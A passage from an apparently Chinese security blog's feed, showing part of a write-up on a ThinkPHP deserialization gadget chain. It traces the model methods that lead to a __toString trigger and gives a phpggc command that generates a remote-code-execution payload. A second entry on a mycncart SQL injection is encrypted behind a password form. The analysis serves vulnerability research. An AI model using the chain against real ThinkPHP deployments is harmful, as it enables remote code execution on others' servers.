...</span></span><br></pre></td></tr></table></figure><p>其中需保证<code>isEmpty</code>返回<code>false</code>，以及<code>$this-&gt;trigger(&#39;BeforeWrite&#39;)</code>返回<code>true</code></p><ol><li>构造<code>$this-&gt;data</code>为非空数组</li><li>构造<code>$this-&gt;withEvent</code>为<code>false</code></li><li>构造<code>$this-&gt;exists</code>为<code>true</code></li></ol><p>从而进入我们需要的<code>updateData</code>函数，来看一下该函数内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">updateData</span><span class="params">()</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 事件回调</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">false</span> === <span class="keyword">$this</span>-&gt;trigger(<span class="string">'BeforeUpdate'</span>)) &#123;<span class="comment">// 此处前面已符合条件</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取有更新的数据</span></span><br><span class="line">    $data = <span class="keyword">$this</span>-&gt;getChangedData();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($data)) &#123;</span><br><span class="line">        <span class="comment">// 关联更新</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;relationWrite)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;autoRelationUpdate();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// 检查允许字段</span></span><br><span class="line">    $allowFields = <span class="keyword">$this</span>-&gt;checkAllowFields(); <span class="comment">// 触发__toString</span></span><br></pre></td></tr></table></figure><p>同样的，为了防止提前<code>return</code>，需要符合<code>$data</code>非空，来看一下<code>getChangedData</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getChangedData</span><span class="params">()</span>: <span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $data = <span class="keyword">$this</span>-&gt;force ? <span class="keyword">$this</span>-&gt;data : array_udiff_assoc(<span class="keyword">$this</span>-&gt;data, <span class="keyword">$this</span>-&gt;origin, <span class="function"><span class="keyword">function</span> <span class="params">($a, $b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">empty</span>($a) || <span class="keyword">empty</span>($b)) &amp;&amp; $a !== $b) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> is_object($a) || $a != $b ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们可以强行置<code>$this-&gt;force</code>为<code>true</code>，直接返回我们前面构造的非空<code>$this-&gt;data</code></p><p>这样，我们就成功到了调用<code>checkAllowFields</code>的位置</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">checkAllowFields</span><span class="params">()</span>: <span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 检测字段</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;field)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;schema)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;field = array_keys(array_merge(<span class="keyword">$this</span>-&gt;schema, <span class="keyword">$this</span>-&gt;jsonType));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $query = <span class="keyword">$this</span>-&gt;db();<span class="comment">// 最终的触发__toString的函数</span></span><br><span class="line">            $table = <span class="keyword">$this</span>-&gt;table ? <span class="keyword">$this</span>-&gt;table . <span class="keyword">$this</span>-&gt;suffix : $query-&gt;getTable();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;field = $query-&gt;getConnection()-&gt;getTableFields($table);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;field;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样，为了到<code>$this-&gt;db()</code>函数的调用，需要</p><ol><li>构造<code>$this-&gt;field</code>为空</li><li>构造<code>$this-&gt;schema</code>为空</li></ol><p>其实这两个地方不需要构造，默认都为空</p><p>最终，我们终于到了可以触发<code>__toString</code>的位置</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">db</span><span class="params">($scope = [])</span>: <span class="title">Query</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/** <span class="doctag">@var</span> Query $query */</span></span><br><span class="line">    $query = <span class="keyword">self</span>::$db-&gt;connect(<span class="keyword">$this</span>-&gt;connection)</span><br><span class="line">        -&gt;name(<span class="keyword">$this</span>-&gt;name . <span class="keyword">$this</span>-&gt;suffix)<span class="comment">// toString</span></span><br><span class="line">        -&gt;pk(<span class="keyword">$this</span>-&gt;pk);</span><br></pre></td></tr></table></figure><p>看到熟悉的字符串拼接了嘛！！！</p><p>不过为了达到该出拼接，我们还是得首先满足<code>connect</code>函数的调用。此处代码就不说了，置<code>$this-&gt;connection</code>为<code>mysql</code>即可。接下来，不管是设<code>$this-&gt;name</code>还是<code>$this-&gt;suffix</code>为最终的触发<code>__toString</code>的对象，都会有同样的效果。</p><p>后续的思路，就是原来<code>vendor/topthink/think-orm/src/model/concern/Conversion.php</code>的<code>__toString</code>开始的利用链，不在叙述。</p><p>我把exp集成到了<a href="https://github.com/wh1t3p1g/phpggc" target="_blank" rel="noopener">phpggc</a>上，使用如下命令即可生成</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./phpggc -u ThinkPHP/RCE2 <span class="string">'phpinfo();'</span></span><br></pre></td></tr></table></figure><p>这里由于用到了SerializableClosure，需要使用编码器编码，不可直接输出拷贝利用。</p>]]></content>
      
      
      <categories>
          
          <category> codereview </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mycncart sqli</title>
      <link href="2019/02/25/php/mycncart-v2-0-0-3-sqli/"/>
      <url>2019/02/25/php/mycncart-v2-0-0-3-sqli/</url>
      
        <content type="html"><![CDATA[<div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="welcome to my blog, enter password to read." />    <label for="pass">welcome to my blog, enter password to read.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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